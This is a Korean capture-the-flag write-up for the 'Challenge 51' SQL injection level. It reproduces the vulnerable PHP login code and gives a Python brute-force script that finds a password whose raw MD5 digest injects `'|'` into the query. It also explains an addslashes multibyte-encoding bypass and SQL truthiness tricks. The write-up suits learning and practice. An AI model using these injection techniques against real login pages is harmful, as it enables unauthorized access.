# 문제

- 소스

  ```php
  <?php
    include "../../config.php";
    if($_GET['view_source']) view_source();
  ?><html>
  <head>
  <title>Challenge 51</title>
  <style>
  table{ color:lightgreen;}
  </style>
  </head>
  <body bgcolor=black><br><br>
  <font color=silver>
  <center><h1>Admin page</h1></center>
  </font>
  <?php
    if($_POST['id'] && $_POST['pw']){
      $db = dbconnect();
      $input_id = addslashes($_POST['id']);
      $input_pw = md5($_POST['pw'],true);
      $result = mysqli_fetch_array(mysqli_query($db,"select id from chall51 where id='{$input_id}' and pw='{$input_pw}'"));
      if($result['id']) solve(51);
      if(!$result['id']) echo "<center><font color=green><h1>Wrong</h1></font></center>";
    }
  ?>
  <br><br><br>
  <form method=post>
  <table border=0 align=center bgcolor=gray width=200 height=100>
  <tr align=center><td>ID</td><td><input type=text name=id></td></tr>
  <tr align=center><td>PW</td><td><input type=password name=pw></td></tr>
  <tr><td colspan=2 align=center><input type=submit></td></tr>
  </table>
  <font color=silver>
  <div align=right><br>.<br>.<br>.<br>.<br><a href=./?view_source=1>view-source</a></div>
  </font>
  </form>
  </body>
  </html>
  ```

- id, pw를 입력받는데

- id는 addslashes 처리가되고, pw는 md5처리가 된다.

- 어떤 id값이라도 받아오면 성공



# 풀이

- addslashes 우회는 아닌 것 같다(멀티바이트 인코딩이 없음)

- 그외 특이점은

  - md5 해쉬의 두번째 인자값을 주었다는 것이다.

  - 공식문서를 보니

    >##### raw_output
    >
    >If the optional `raw_output` is set to **TRUE**, then the md5 digest is instead returned in raw binary format with a length of 16.

    - 로우 바이너리 형식으로 출력된다고 한다.
    - 이거다.

- md5 해쉬로 sql 인젝션을 시도하자

  - 최대한 간략한 쿼리를 구성해보자.

  - `[ascii]'|'[ascii]`

  - 파이썬으로 해당 값을 출력하는 plain text를 찾아보자

  - 소스

    ```python
    import hashlib
    
    wanted = '\'|\'' #first, ended is anything in ascii
    
    from itertools import product 
    chars = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' # Chars Dictionary 
    for length in range(1, 10): # length 1 to 4 
        x = product(chars, repeat=length)
        for attempt in x:
            strs = ''.join(attempt)
            print 'attempt: ' + strs
            res = hashlib.md5(strs).hexdigest().decode('hex')
            # first is ascii and middle is wanted and ended is ascii
            print 'results: ' + res[0:len(wanted)+2]
            if res[1:len(wanted)+1] == wanted:
                print 'founded!!!'
                with open('password', 'w') as f:
                    f.write(res[:len(wanted)+2])
                raw_input('press a any key to exit')
                break
    
    raw_input('')
    ```

- id는 admin으로 하고 password는 결과값으로 설정하면 끝

  

# 알게된 것

### addslashes / stripslashes

- DB 오류를 일으킬 수 있는 특수문자 앞에 백슬래쉬를 추가하여 일반 문자로 치환시킨다.
  - stripslashes는 백슬래쉬를 제거
- 취급문자
  - ``'`, `"`, `\`, `Null byte`
- PHP 5.4 버전 이전에는 `magic_quote_gpc`가 자동 on 되있다고 한다.
  - addslashes를 자동으로 해주는거

- 우회방법
  - 전제
    - 멀티바이트 인코딩시 가능(`mb_convert_encoding`)
  - 순서
    - 싱글쿼터 앞에 %f1을(다른 멀티바이트로 취급되는 문자 모두 가능) 삽입한다.
    - addslashes를 거쳐 %f1%5c(백슬래시)%27가 된다.
    - 멀티바이트 인코딩시 %f1%5c를 하나의 문자로 인식한다.
    - 백슬래시가 제거된 %27(싱글쿼터)로 쿼리에서 인식하게 된다. 
  - 위 문제와는 관련 없어보인다..



### product from itertools in python

- 무작위 문자열 생성 도구

- [소스 - ruinick 티스토리](https://ruinick.tistory.com/13)

  ```python
  from itertools import 
  product chars = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' # Chars Dictionary 
  for length in range(1, 5): # length 1 to 4 
  	to_attempt = product(chars, repeat=length) 
  	for attempt in to_attempt: 
  		brute = ''.join(attempt) 
  		print brute
  ```

  - 튜플(?) 형태로 반환되기 때문에 join 시켜줘야 한다.

### SQL 논리 연산

- `or 1=1`처럼 굳이 or과 수식 안적어도 되고
- `|'123'`처럼 아무런 문자열 넣어도 True로 취급

